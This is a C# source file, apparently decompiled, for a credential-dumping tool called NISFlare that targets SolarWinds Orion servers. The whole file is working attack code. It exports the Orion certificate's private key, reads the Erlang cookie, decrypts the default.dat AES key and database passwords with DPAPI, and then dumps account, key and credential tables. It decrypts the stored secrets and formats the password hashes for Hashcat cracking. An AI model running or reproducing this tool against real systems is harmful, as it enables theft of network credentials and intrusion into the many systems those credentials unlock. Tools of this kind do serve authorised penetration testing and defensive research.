using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Cryptography.Xml;
using System.Text;
using System.Xml;
using Microsoft.Win32;

namespace NISFlare;

internal class Program
{
	internal class FlareData
	{
		internal class FlareDB
		{
			internal class DbCredential
			{
				internal string DbHost { get; set; }

				internal string DbUser { get; set; }

				internal string DbPass { get; set; }

				internal string DbDB { get; set; }

				internal bool DbEncrypted { get; set; }

				internal bool DbTrustCert { get; set; }

				internal bool DBIntegratedSecurity { get; set; }

				internal string DBIntegratedSecurityString { get; set; }
			}

			internal SqlConnection Connection { get; set; }

			internal List<DbCredential> Credentials { get; set; } = new List<DbCredential>();

		}

		internal class SWCert
		{
			internal X509Certificate2 Cert { get; set; }

			internal byte[] Pfx { get; set; }

			internal string B64pfx { get; set; }

			internal string Password { get; set; }

			internal bool IsPresent { get; set; }

			internal bool Exported { get; set; }
		}

		internal class DatHex
		{
			internal byte[] DatEncrypted { get; set; }

			internal string DatEncryptedHex { get; set; }

			internal byte[] DatDecrypted { get; set; }

			internal string DatDecryptedHex { get; set; }

			internal bool IsPresent { get; set; }

			internal bool Decrypted { get; set; }
		}

		internal DatHex Dat { get; set; }

		internal SWCert CertData { get; set; }

		internal string CertPass { get; set; }

		internal string ErlangCookie { get; set; }

		internal FlareDB Db { get; set; } = new FlareDB();

	}

	internal static FlareData flare = new FlareData();

	private static void Main(string[] args)
	{
		Console.WriteLine("Don't look directly into the sun...");
		Console.WriteLine("Tool Developers by @XSVSCyb3r");
		Console.WriteLine("============================================");
		if (args.Length != 0)
		{
			string text = args[0];
			if (File.Exists(text))
			{
				using StreamReader streamReader = File.OpenText(text);
				string text2;
				while (!streamReader.EndOfStream && (text2 = streamReader.ReadLine()) != null)
				{
					ParseConnectionString(text2);
				}
			}
			else
			{
				Console.WriteLine("File not found: " + text);
				Environment.Exit(1);
			}
		}
		else
		{
			Console.WriteLine(" A connection string file can be used by");
			Console.WriteLine(" specifying the file path as an argument");
		}
		Console.WriteLine("============================================");
		Console.WriteLine("| Collecting RabbitMQ Erlang Cookie");
		flare.ErlangCookie = GetErlangCookie();
		if (!string.IsNullOrEmpty(flare.ErlangCookie))
		{
			Console.WriteLine("| \tErlang Cookie: " + flare.ErlangCookie);
		}
		else
		{
			Console.WriteLine("| \tErlang Cookie: Not found!");
		}
		Console.WriteLine("============================================");
		Console.WriteLine("| Collecting SolarWinds Certificate");
		flare.CertData = GetCertificate();
		if (flare.CertData.IsPresent)
		{
			Console.WriteLine("| \tSubject Name: " + flare.CertData.Cert.Subject);
			Console.WriteLine("| \tThumbprint  : " + flare.CertData.Cert.Thumbprint);
			if (flare.CertData.Exported)
			{
				Console.WriteLine("| \tPassword    : " + flare.CertData.Password);
				Console.WriteLine("| \tPrivate Key : " + flare.CertData.B64pfx);
			}
		}
		else
		{
			Console.WriteLine("| Certificate NOT FOUND. Some decryption will fail...");
		}
		Console.WriteLine("============================================");
		Console.WriteLine("| Collecting Default.DAT file");
		flare.Dat = GetDat();
		if (flare.Dat.IsPresent)
		{
			Console.WriteLine("| \tEncrypted: " + flare.Dat.DatEncryptedHex);
		}
		if (flare.Dat.Decrypted)
		{
			Console.WriteLine("| \tDecrypted: " + flare.Dat.DatDecryptedHex);
		}
		Console.WriteLine("============================================");
		Console.WriteLine("| Collecting Database Credentials          |");
		GetDatabaseConnection();
		Console.WriteLine($"| \tNumber of database credentials found: {flare.Db.Credentials.Count()}");
		Console.WriteLine("============================================");
		Console.WriteLine("| Connecting to the Database              |");
		if (CheckDbConnection())
		{
			DumpDBCreds();
			((DbConnection)(object)flare.Db.Connection).Close();
		}
		else
		{
			Console.WriteLine("| \tAll Database connections failed. We have done all we can do here...");
		}
		Console.WriteLine("============================================");
		Console.WriteLine("============================================");
	}

	private static string GetErlangCookie()
	{
		string environmentVariable = Environment.GetEnvironmentVariable("programdata");
		environmentVariable += "\\SolarWinds\\Orion\\RabbitMQ\\.erlang.cookie";
		string result = null;
		if (File.Exists(environmentVariable))
		{
			result = File.ReadAllText(environmentVariable);
		}
		return result;
	}

	private static FlareData.SWCert GetCertificate()
	{
		FlareData.SWCert sWCert = new FlareData.SWCert();
		string randomFileName = Path.GetRandomFileName();
		sWCert.Password = randomFileName.Replace(".", "");
		X509Store x509Store = new X509Store(StoreName.My, StoreLocation.LocalMachine);
		using (File.Create("C:\\Windows\\Temp\\SolarFlare"))
		{
		}
		x509Store.Open(OpenFlags.ReadOnly);
		sWCert.IsPresent = false;
		sWCert.Exported = false;
		X509Certificate2Enumerator enumerator = x509Store.Certificates.GetEnumerator();
		while (enumerator.MoveNext())
		{
			X509Certificate2 current = enumerator.Current;
			if (!current.Subject.StartsWith("CN=SolarWinds-Orion"))
			{
				continue;
			}
			sWCert.Cert = current;
			sWCert.IsPresent = true;
			Console.WriteLine("| \tSolarWinds Orion Certificate Found!");
			try
			{
				if (sWCert.Cert.PrivateKey != null)
				{
					byte[] inArray = (sWCert.Pfx = current.Export(X509ContentType.Pfx, sWCert.Password));
					sWCert.B64pfx = Convert.ToBase64String(inArray);
					sWCert.Exported = true;
				}
			}
			catch
			{
				Console.WriteLine("| \tRequires Admin to export the cert, but decryption should still work..");
			}
		}
		return sWCert;
	}

	private static FlareData.DatHex GetDat()
	{
		FlareData.DatHex datHex = new FlareData.DatHex();
		string environmentVariable = Environment.GetEnvironmentVariable("programdata");
		environmentVariable += "\\SolarWinds\\KeyStorage\\CryptoHelper\\default.dat";
		if (File.Exists(environmentVariable))
		{
			using (BinaryReader binaryReader = new BinaryReader(File.Open(environmentVariable, FileMode.Open, FileAccess.Read, FileShare.Read)))
			{
				binaryReader.ReadInt32();
				int count = binaryReader.ReadInt32();
				datHex.DatEncrypted = binaryReader.ReadBytes(count);
				datHex.DatEncryptedHex = BitConverter.ToString(datHex.DatEncrypted).Replace("-", "");
				datHex.IsPresent = true;
			}
			try
			{
				datHex.DatDecrypted = ProtectedData.Unprotect(datHex.DatEncrypted, (byte[])null, (DataProtectionScope)1);
				datHex.DatDecryptedHex = BitConverter.ToString(datHex.DatDecrypted).Replace("-", "");
				datHex.Decrypted = true;
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
		else
		{
			Console.WriteLine("| \tFailed to access Default.dat file");
			Console.WriteLine("| \tThis will result in a failure to decrypt AES encrypted passwords");
		}
		return datHex;
	}

	private static void ParseConnectionString(string text)
	{
		byte[] array = new byte[8] { 2, 0, 1, 2, 0, 3, 0, 9 };
		string environmentVariable = Environment.GetEnvironmentVariable("programdata");
		environmentVariable += "\\SolarWinds\\CredentialStorage\\SolarWindsDatabaseAccessCredential.json";
		new Dictionary<string, string>(StringComparer.InvariantCultureIgnoreCase);
		FlareData.FlareDB.DbCredential dbCredential = new FlareData.FlareDB.DbCredential();
		Dictionary<string, string> dictionary = (from value in text.Split(new char[1] { ';' })
			select value.Split(new char[1] { '=' })).ToDictionary<string[], string, string>((string[] pair) => pair[0], (string[] pair) => pair[1], StringComparer.OrdinalIgnoreCase);
		if (dictionary.ContainsKey("Initial Catalog"))
		{
			dbCredential.DbDB = dictionary["Initial Catalog"];
		}
		if (dictionary.ContainsKey("Data Source"))
		{
			dbCredential.DbHost = dictionary["Data Source"];
		}
		if (dictionary.ContainsKey("User ID"))
		{
			dbCredential.DbUser = dictionary["User ID"];
		}
		if (dictionary.ContainsKey("encrypt"))
		{
			if (dictionary["encrypt"].ToUpper() == "TRUE")
			{
				dbCredential.DbEncrypted = true;
				if (dictionary.ContainsKey("trustservercertificate"))
				{
					if (dictionary["trustservercertificate"].ToUpper() == "TRUE")
					{
						dbCredential.DbTrustCert = true;
					}
					else
					{
						dbCredential.DbTrustCert = false;
					}
				}
			}
			else
			{
				dbCredential.DbEncrypted = false;
			}
		}
		if (dictionary.ContainsKey("Integrated Security"))
		{
			dbCredential.DBIntegratedSecurity = true;
			dbCredential.DBIntegratedSecurityString = dictionary["Integrated Security"];
			if (File.Exists(environmentVariable))
			{
				Dictionary<string, string> dictionary2 = (from value in File.ReadAllText(environmentVariable).TrimStart(new char[1] { '{' }).TrimEnd(new char[1] { '}' })
						.Replace("\"", "")
						.Split(new char[1] { ',' })
					select value.Split(new char[1] { ':' })).ToDictionary<string[], string, string>((string[] pair) => pair[0], (string[] pair) => pair[1], StringComparer.OrdinalIgnoreCase);
				if (dictionary2.ContainsKey("Password"))
				{
					dbCredential.DbPass = Decrypt(dictionary2["Password"]);
				}
				if (dictionary2.ContainsKey("Username"))
				{
					dbCredential.DbUser = dictionary2["Username"];
				}
			}
		}
		else if (dictionary.ContainsKey("Encrypted.Password"))
		{
			string text2 = dictionary["Encrypted.Password"].Replace("\"", "");
			byte[] array2;
			try
			{
				array2 = Convert.FromBase64String(text2);
			}
			catch
			{
				try
				{
					array2 = Convert.FromBase64String(text2 + "=");
				}
				catch
				{
					array2 = Convert.FromBase64String(text2 + "==");
				}
			}
			try
			{
				dbCredential.DbPass = Encoding.UTF8.GetString(ProtectedData.Unprotect(array2, array, (DataProtectionScope)1));
			}
			catch
			{
				Console.WriteLine("Decrypt Failed for " + text2);
			}
		}
		else if (dictionary.ContainsKey("Password"))
		{
			dbCredential.DbPass = dictionary["Password"];
		}
		else
		{
			Console.WriteLine("--------------------------------------------");
			Console.WriteLine($"| \tUnrecognized Connection String: {dictionary}");
		}
		Console.WriteLine("| \tConnection String: Data Source=" + dbCredential.DbHost + ";Initial Catalog=" + dbCredential.DbDB + ";User ID=" + dbCredential.DbUser + ";Password=" + dbCredential.DbPass);
		try
		{
			flare.Db.Credentials.Add(dbCredential);
		}
		catch (Exception value2)
		{
			Console.WriteLine(value2);
		}
	}

	private static void GetDatabaseConnection()
	{
		string text = "";
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Wow6432Node\\SolarWinds\\Orion\\Core");
			if (registryKey != null)
			{
				object value = registryKey.GetValue("InstallPath");
				if (value != null)
				{
					text = value as string;
					text += "SWNetPerfMon.DB";
				}
			}
			else
			{
				Console.WriteLine("============================================");
				Console.WriteLine("It doesn't appear that SolarWinds Orion is installed here. Exiting...");
				Environment.Exit(1);
			}
		}
		catch
		{
			text = Environment.GetEnvironmentVariable("programfiles(x86)");
			text += "\\SolarWinds\\Orion\\SWNetPerfMon.DB";
		}
		Console.WriteLine("| \tPath to SWNetPerfMon.DB is: " + text);
		if (!File.Exists(text))
		{
			return;
		}
		new Dictionary<string, string>(StringComparer.InvariantCultureIgnoreCase);
		using StreamReader streamReader = File.OpenText(text);
		string text2;
		while (!streamReader.EndOfStream && (text2 = streamReader.ReadLine()) != null)
		{
			if (text2.StartsWith("ConnectionString"))
			{
				ParseConnectionString(text2);
			}
			else if (text2.StartsWith("Connection"))
			{
				Console.WriteLine("| " + text2);
			}
		}
	}

	private static bool CheckDbConnection()
	{
		//IL_0145: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		if (flare.Db.Credentials.Count > 0)
		{
			foreach (FlareData.FlareDB.DbCredential credential in flare.Db.Credentials)
			{
				try
				{
					SqlConnection val = new SqlConnection();
					((DbConnection)(object)val).ConnectionString = "Data Source=" + credential.DbHost + ";Initial Catalog=" + credential.DbDB + ";User ID=" + credential.DbUser + ";Password=" + credential.DbPass;
					((DbConnection)(object)val).ConnectionString += ";MultipleActiveResultSets=true";
					if (credential.DBIntegratedSecurity)
					{
						((DbConnection)(object)val).ConnectionString = ((DbConnection)(object)val).ConnectionString + ";Integrated Security=" + credential.DBIntegratedSecurityString;
					}
					if (credential.DbEncrypted)
					{
						((DbConnection)(object)val).ConnectionString += ";encrypt=True";
						if (credential.DbTrustCert)
						{
							((DbConnection)(object)val).ConnectionString += ";trustservercertificate=True";
						}
					}
					try
					{
						((DbConnection)(object)val).Open();
						if (((DbConnection)(object)val).State == ConnectionState.Open)
						{
							Console.WriteLine("| \tSuccessfully connected to: {0}", ((DbConnection)(object)val).ConnectionString);
							flare.Db.Connection = val;
							break;
						}
					}
					catch (SqlException val2)
					{
						SqlException val3 = val2;
						Console.WriteLine("| \tConnection failed to: " + ((DbConnection)(object)val).ConnectionString);
						Console.WriteLine($"| \t\t Exception: {((ExternalException)(object)val3).ErrorCode} - {((Exception)(object)val3).Message}");
					}
				}
				catch
				{
					Console.WriteLine("| \t CONNECTION STRING INVALID: Data Source = " + credential.DbHost + "; Initial Catalog = " + credential.DbDB + "; User ID = " + credential.DbUser + "; Password = " + credential.DbPass);
				}
			}
		}
		if (flare.Db.Connection != null && ((DbConnection)(object)flare.Db.Connection).State == ConnectionState.Open)
		{
			return true;
		}
		return false;
	}

	private static string Decrypt(string encString)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		if (encString.StartsWith("<"))
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(encString);
			new EncryptedXml(xmlDocument).DecryptDocument();
			return xmlDocument.FirstChild.InnerText;
		}
		if (encString.StartsWith("-"))
		{
			return DecryptAes(encString);
		}
		return DecryptString(encString);
	}

	private static string DecryptString(string encString)
	{
		string result = "";
		try
		{
			byte[] bytes = ((RSACryptoServiceProvider)flare.CertData.Cert.PrivateKey).Decrypt(Convert.FromBase64String(encString), fOAEP: false);
			result = Encoding.Unicode.GetString(bytes);
		}
		catch
		{
			Console.WriteLine("| \tDecryption failed for -> " + encString);
		}
		return result;
	}

	private static string DecryptAes(string encryptedText)
	{
		if (flare.Dat.DatDecrypted != null)
		{
			string text = "";
			string s = encryptedText.Remove(0, "-enc-".Length).Split(new char[1] { '-' })[1];
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.BlockSize = 128;
			aesCryptoServiceProvider.Mode = CipherMode.CBC;
			aesCryptoServiceProvider.Key = flare.Dat.DatDecrypted;
			using MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(s));
			byte[] array = new byte[16];
			if (memoryStream.Read(array, 0, array.Length) != array.Length)
			{
				throw new InvalidOperationException("Cannot read header.");
			}
			aesCryptoServiceProvider.IV = array;
			return DecryptFromStream(memoryStream, aesCryptoServiceProvider);
		}
		return "DAT FILE REQUIRED TO DECRYPT: " + encryptedText;
	}

	private static string DecryptFromStream(Stream stream, AesCryptoServiceProvider aes)
	{
		using CryptoStream stream2 = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using StreamReader streamReader = new StreamReader(stream2);
		return streamReader.ReadToEnd();
	}

	private static string DecodeOldPassword(string password)
	{
		if (string.IsNullOrEmpty(password))
		{
			return string.Empty;
		}
		bool flag = password.StartsWith("U-");
		if (flag)
		{
			password = password.Replace("U-", "");
		}
		string s = password.Substring(0, password.IndexOf("-"));
		password = password.Substring(password.IndexOf('-') + 1);
		password = password.Replace("-", "");
		password = password.Trim();
		string text = string.Empty;
		for (int i = 1; i <= password.Length - 1; i += 2)
		{
			text = text + password[i] + password[i - 1];
		}
		if (text.Length < password.Length)
		{
			text += password[password.Length - 1];
		}
		password = text;
		long.TryParse(s, out var result);
		text = longDivision(password, result);
		text = longDivision(text, 1244352345234L);
		text = text.Substring(1);
		password = string.Empty;
		int num = (flag ? 5 : 3);
		for (int j = 0; j < text.Length; j += num)
		{
			password += Convert.ToChar(int.Parse(text.Substring(j, Math.Min(num, text.Length - j))));
		}
		return password;
	}

	private static string longDivision(string number, long divisor)
	{
		string text = "";
		int num = 0;
		long num2 = number[num] - 48;
		while (num2 < divisor)
		{
			num2 = num2 * 10 + (number[num + 1] - 48);
			num++;
		}
		for (num++; number.Length > num; num++)
		{
			text += (char)(num2 / divisor + 48);
			num2 = num2 % divisor * 10 + (number[num] - 48);
		}
		text += (char)(num2 / divisor + 48);
		if (text.Length == 0)
		{
			return "0";
		}
		return text;
	}

	private static void DumpDBCreds()
	{
		DataTable schema = ((DbConnection)(object)flare.Db.Connection).GetSchema("Tables");
		List<string> list = new List<string>();
		foreach (DataRow row in schema.Rows)
		{
			list.Add(row[2].ToString());
		}
		if (list.Contains("Key"))
		{
			Console.WriteLine("============================================");
			Console.WriteLine("| DB - Exporting Key Table                 |");
			ExportKeyTable();
		}
		if (list.Contains("Accounts"))
		{
			Console.WriteLine("============================================");
			Console.WriteLine("| DB - Exporting Accounts Table            |");
			ExportAccountsTable();
		}
		if (list.Contains("CredentialProperty"))
		{
			Console.WriteLine("============================================");
			Console.WriteLine("| DB - Exporting Credentials Table         |");
			ExportCredsTable();
		}
	}

	private static void ExportKeyTable()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		try
		{
			SqlCommand val = new SqlCommand("SELECT keyid, encryptedkey, kind, purpose, protectiontype, protectionvalue, protectiondetails from [dbo].[key]", flare.Db.Connection);
			try
			{
				SqlDataReader val2 = val.ExecuteReader();
				try
				{
					while (((DbDataReader)(object)val2).Read())
					{
						Console.WriteLine($"| \tKeyID: {((DbDataReader)(object)val2).GetInt32(0)}\n" + "| \tEncrypted Key: " + ((DbDataReader)(object)val2).GetString(1) + "\n| \tKind: " + ((DbDataReader)(object)val2).GetString(2) + "\n| \tPurpose: " + ((DbDataReader)(object)val2).GetString(3) + "\n" + $"| \tProtection Type: {((DbDataReader)(object)val2).GetInt32(4)}\n" + "| \tProtection Value: " + ((DbDataReader)(object)val2).GetString(5) + "\n| \tProtection Details: " + ((DbDataReader)(object)val2).GetString(6) + "\n------------------------------------------------");
					}
					((DbDataReader)(object)val2).Close();
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception arg)
		{
			Console.WriteLine("| [-] Something went wrong: {0}", arg);
		}
	}

	private static List<string> GetColumnList(string tablename)
	{

		List<string> list = new List<string>();
		SqlCommand val = new SqlCommand("select c.name from sys.columns c inner join sys.tables t on t.object_id = c.object_id and t.name = '" + tablename + "' and t.type = 'U'", flare.Db.Connection);
		try
		{
			SqlDataReader val2 = val.ExecuteReader();
			try
			{
				while (((DbDataReader)(object)val2).Read())
				{
					list.Add(((DbDataReader)(object)val2).GetString(0));
				}
				((DbDataReader)(object)val2).Close();
				return list;
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private static void ExportAccountsTable()
	{

		List<string> list = new List<string>();
		list = GetColumnList("Accounts");
		if (list.Contains("Password"))
		{
			SqlCommand val = new SqlCommand("SELECT accountid, password, passwordhash, accountenabled, allowadmin, lastlogin, accountsid, groupinfo from [dbo].[Accounts]", flare.Db.Connection);
			try
			{
				SqlDataReader val2 = val.ExecuteReader();
				try
				{
					while (((DbDataReader)(object)val2).Read())
					{
						if (!((DbDataReader)(object)val2).IsDBNull(0))
						{
							Console.WriteLine("|\t Account: " + ((DbDataReader)(object)val2).GetString(0));
						}
						if (!((DbDataReader)(object)val2).IsDBNull(1))
						{
							Console.WriteLine("|\t Password: " + ((DbDataReader)(object)val2).GetString(1));
						}
						try
						{
							string text = DecodeOldPassword(((DbDataReader)(object)val2).GetString(1));
							Console.WriteLine("|\t Decoded Password: " + text);
						}
						catch
						{
						}
						if (!((DbDataReader)(object)val2).IsDBNull(2))
						{
							Console.WriteLine("|\t Hashcat Mode 21500: $solarwinds$0$" + ((DbDataReader)(object)val2).GetString(0).ToLower() + "$" + ((DbDataReader)(object)val2).GetString(2));
						}
						if (!((DbDataReader)(object)val2).IsDBNull(3))
						{
							Console.WriteLine("|\t Account Enabled: " + ((DbDataReader)(object)val2).GetString(3));
						}
						if (!((DbDataReader)(object)val2).IsDBNull(4))
						{
							Console.WriteLine("|\t Allow Admin: " + ((DbDataReader)(object)val2).GetString(4));
						}
						if (!((DbDataReader)(object)val2).IsDBNull(5))
						{
							Console.WriteLine("|\t Last Login: " + ((DbDataReader)(object)val2).GetDateTime(5).ToString("MM/dd/yyyy"));
						}
						if (!((DbDataReader)(object)val2).IsDBNull(6))
						{
							Console.WriteLine("|\t Account SID: " + ((DbDataReader)(object)val2).GetString(6));
						}
						if (!((DbDataReader)(object)val2).IsDBNull(7))
						{
							Console.WriteLine("|\t Group: " + ((DbDataReader)(object)val2).GetString(7));
						}
						Console.WriteLine("--------------------------------------------");
					}
					((DbDataReader)(object)val2).Close();
					return;
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		if (!list.Contains("PasswordSalt"))
		{
			SqlCommand val3 = new SqlCommand("SELECT accountid,passwordhash, accountenabled, allowadmin, lastlogin, accountsid, groupinfo from [dbo].[Accounts]", flare.Db.Connection);
			try
			{
				SqlDataReader val4 = val3.ExecuteReader();
				try
				{
					while (((DbDataReader)(object)val4).Read())
					{
						if (!((DbDataReader)(object)val4).IsDBNull(0))
						{
							Console.WriteLine("|\t Account: " + ((DbDataReader)(object)val4).GetString(0));
						}
						if (!((DbDataReader)(object)val4).IsDBNull(1))
						{
							Console.WriteLine("|\t Hashcat Mode 21500: $solarwinds$0$" + ((DbDataReader)(object)val4).GetString(0).ToLower() + "$" + ((DbDataReader)(object)val4).GetString(1));
						}
						if (!((DbDataReader)(object)val4).IsDBNull(2))
						{
							Console.WriteLine("|\t Account Enabled: " + ((DbDataReader)(object)val4).GetString(2));
						}
						if (!((DbDataReader)(object)val4).IsDBNull(3))
						{
							Console.WriteLine("|\t Allow Admin: " + ((DbDataReader)(object)val4).GetString(3));
						}
						if (!((DbDataReader)(object)val4).IsDBNull(4))
						{
							Console.WriteLine("|\t Last Login: " + ((DbDataReader)(object)val4).GetDateTime(4).ToString("MM/dd/yyyy"));
						}
						if (!((DbDataReader)(object)val4).IsDBNull(5))
						{
							Console.WriteLine("|\t Account SID: " + ((DbDataReader)(object)val4).GetString(5));
						}
						if (!((DbDataReader)(object)val4).IsDBNull(6))
						{
							Console.WriteLine("|\t Group: " + ((DbDataReader)(object)val4).GetString(6));
						}
						Console.WriteLine("--------------------------------------------");
					}
					((DbDataReader)(object)val4).Close();
					return;
				}
				finally
				{
					((IDisposable)val4)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
		}
		SqlCommand val5 = new SqlCommand("SELECT accountid, passwordhash, passwordsalt, accountenabled, allowadmin, lastlogin, accountsid, groupinfo from [dbo].[Accounts]", flare.Db.Connection);
		try
		{
			SqlDataReader val6 = val5.ExecuteReader();
			try
			{
				while (((DbDataReader)(object)val6).Read())
				{
					if (!((DbDataReader)(object)val6).IsDBNull(0))
					{
						Console.WriteLine("|\t Account: " + ((DbDataReader)(object)val6).GetString(0));
					}
					if (!((DbDataReader)(object)val6).IsDBNull(1))
					{
						Console.WriteLine("|\t Password Hash: " + ((DbDataReader)(object)val6).GetString(1));
					}
					if (!((DbDataReader)(object)val6).IsDBNull(2))
					{
						Console.WriteLine("|\t Password Salt: " + ((DbDataReader)(object)val6).GetString(2));
						try
						{
							Console.WriteLine("|\t Hashcat Mode 12501: $solarwinds$1$" + ((DbDataReader)(object)val6).GetString(2) + "$" + ((DbDataReader)(object)val6).GetString(1));
						}
						catch
						{
						}
					}
					else
					{
						Console.WriteLine("|\t Salt is NULL in DB so lowercase username is used: " + ((DbDataReader)(object)val6).GetString(0).ToLower());
						Console.WriteLine("|\t Hashcat Mode 21500: $solarwinds$0$" + ((DbDataReader)(object)val6).GetString(0).ToLower() + "$" + ((DbDataReader)(object)val6).GetString(1));
					}
					if (!((DbDataReader)(object)val6).IsDBNull(3))
					{
						Console.WriteLine("|\t Account Enabled: " + ((DbDataReader)(object)val6).GetString(3));
					}
					if (!((DbDataReader)(object)val6).IsDBNull(4))
					{
						Console.WriteLine("|\t Allow Admin: " + ((DbDataReader)(object)val6).GetString(4));
					}
					if (!((DbDataReader)(object)val6).IsDBNull(5))
					{
						Console.WriteLine("|\t Last Login: " + ((DbDataReader)(object)val6).GetDateTime(5).ToString("MM/dd/yyyy"));
					}
					if (!((DbDataReader)(object)val6).IsDBNull(6))
					{
						Console.WriteLine("|\t Account SID: " + ((DbDataReader)(object)val6).GetString(6));
					}
					if (!((DbDataReader)(object)val6).IsDBNull(7))
					{
						Console.WriteLine("|\t Group: " + ((DbDataReader)(object)val6).GetString(7));
					}
					Console.WriteLine("--------------------------------------------");
				}
				((DbDataReader)(object)val6).Close();
			}
			finally
			{
				((IDisposable)val6)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val5)?.Dispose();
		}
	}

	private static void ExportCredsTable()
	{

		try
		{
			SqlCommand val = new SqlCommand("SELECT id, name, description, credentialtype, credentialowner from [dbo].[Credential]", flare.Db.Connection);
			try
			{
				SqlDataReader val2 = val.ExecuteReader();
				try
				{
					while (((DbDataReader)(object)val2).Read())
					{
						int @int = ((DbDataReader)(object)val2).GetInt32(0);
						string text = "";
						string text2 = "";
						if (!((DbDataReader)(object)val2).IsDBNull(1))
						{
							text = ((DbDataReader)(object)val2).GetString(1);
						}
						if (!((DbDataReader)(object)val2).IsDBNull(2))
						{
							text2 = ((DbDataReader)(object)val2).GetString(2);
						}
						string @string = ((DbDataReader)(object)val2).GetString(3);
						string string2 = ((DbDataReader)(object)val2).GetString(4);
						Console.WriteLine($"------------------{@int}--------------------------");
						Console.WriteLine("| Type: " + @string);
						Console.WriteLine("| Name: " + text);
						Console.WriteLine("| \tDesc: " + text2);
						Console.WriteLine("| \tOwner: " + string2);
						SqlCommand val3 = new SqlCommand("SELECT name, value, encrypted " + $"from [dbo].[CredentialProperty] where credentialid={@int}", flare.Db.Connection);
						try
						{
							SqlDataReader val4 = val3.ExecuteReader();
							try
							{
								Dictionary<string, string> dictionary = new Dictionary<string, string>();
								while (((DbDataReader)(object)val4).Read())
								{
									string key = "";
									string text3 = "";
									if (!((DbDataReader)(object)val4).IsDBNull(0))
									{
										key = ((DbDataReader)(object)val4).GetString(0);
									}
									if (!((DbDataReader)(object)val4).IsDBNull(1))
									{
										text3 = ((DbDataReader)(object)val4).GetString(1);
									}
									if (!((DbDataReader)(object)val4).GetBoolean(2))
									{
										dictionary.Add(key, text3);
									}
									else
									{
										dictionary.Add(key, Decrypt(text3));
									}
								}
								((DbDataReader)(object)val4).Close();
								foreach (KeyValuePair<string, string> item in dictionary)
								{
									Console.WriteLine("| \t\t" + item.Key + ": " + item.Value);
								}
							}
							finally
							{
								((IDisposable)val4)?.Dispose();
							}
						}
						finally
						{
							((IDisposable)val3)?.Dispose();
						}
						Console.WriteLine($"------------------{@int}--------------------------");
					}
					((DbDataReader)(object)val2).Close();
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("| Credential table not found or we had a decryption error... That's weird...");
			Console.WriteLine("| Exception: " + ex);
		}
	}

	public static byte[] StringToByteArray(string hex)
	{
		return (from x in Enumerable.Range(0, hex.Length)
			where x % 2 == 0
			select Convert.ToByte(hex.Substring(x, 2), 16)).ToArray();
	}

	public static string ByteArrayToString(byte[] ba)
	{
		return BitConverter.ToString(ba).Replace("-", "");
	}
}
